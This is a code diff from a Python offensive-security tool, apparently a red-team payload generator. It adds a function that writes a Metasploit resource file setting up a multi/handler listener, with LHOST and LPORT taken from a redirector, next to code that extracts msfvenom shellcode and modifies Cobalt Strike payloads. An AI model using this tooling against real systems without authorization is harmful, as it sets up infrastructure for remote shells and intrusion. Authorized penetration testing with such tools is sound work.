@@ -141,11 +141,31 @@ def getMetasploitShellCode(redirector):
 
 		shellCode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", code, flags=re.MULTILINE)
 		msfShellCode = ''.join(i[0].replace('', '') for i in shellCode)
+		generateMetasploitReourceFile(redirector)
 
 		return msfShellCode
 	else:
 		print('[-] ERROR: msfvenom is not installed on the system. Please install msfvenom to use Great SCT.')
 		exit()
+def generateMetasploitReourceFile(redirector):
+	msfrc = '''load auto_add_route
+load alias
+alias del rm
+alias handler use exploit/multi/handler
+
+load sounds
+
+setg TimestampOutput true
+setg VERBOSE true
+
+setg ExitOnSession false
+setg EnableStageEncoding true
+setg LHOST {0}
+setg LPORT {1}
+'''.format(redirector[0], redirector[1])
+
+	with open('msfconsole.rc', 'w') as f:
+		f.write(msfrc)
 
 def modifyCobaltStrikePayload(cspayload, x86, x64):
 	'''
